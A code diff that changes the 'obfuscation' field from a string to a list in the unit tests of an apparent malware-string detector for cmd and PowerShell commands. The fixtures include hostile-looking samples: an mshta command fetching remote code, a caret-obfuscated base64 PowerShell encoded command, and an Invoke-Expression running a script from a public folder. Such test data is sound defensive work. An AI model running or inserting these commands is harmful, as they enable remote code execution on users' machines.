@@ -79,7 +79,7 @@ def test_find_cmd_strings():
         Hit(value=b'cmd /c mshta http://some.url/x.html',
             start=13,
             end=55,
-            obfuscation='unescape.shell.carets')
+            obfuscation=['unescape.shell.carets'])
     ]
 
 
@@ -88,7 +88,7 @@ def test_find_powershell_strings_enc():
     ex = b'powershell /e ZQBj^AGgAbwAgAGIAZQ^BlAA=='
     assert find_powershell_strings(ex) == [
         Hit(value=b'powershell -Command echo bee',
-            obfuscation='unescape.shell.carets/>powershell.base64',
+            obfuscation=['unescape.shell.carets', 'powershell.base64'],
             start=0,
             end=len(ex))
     ]
@@ -99,7 +99,7 @@ def test_find_powershell_for_loop():
          b"| %%{$_ -replace '[^a-zA-Z0-9]+', '_'}\"') do echo prx.%%a"
     assert find_powershell_strings(ex) == [
         Hit(value=b"powershell -Command \"hostname | %%{$_ -replace '[^a-zA-Z0-9]+', '_'}\"",
-            obfuscation='',
+            obfuscation=[],
             start=27,
             end=96)
     ]
@@ -109,7 +109,7 @@ def test_find_powershell_strings_invoke_expression():
     ex = b"Invoke-Expression 'PowerShell -ExecutionPolicy RemoteSigned -File C:\\Users\\Public\\mvbskt0pnk.PS1'"
     assert find_powershell_strings(ex) == [
         Hit(value=b'PowerShell -ExecutionPolicy RemoteSigned -File C:\\Users\\Public\\mvbskt0pnk.PS1',
-            obfuscation='',
+            obfuscation=[],
             start=19,
             end=len(ex)-1)
     ]
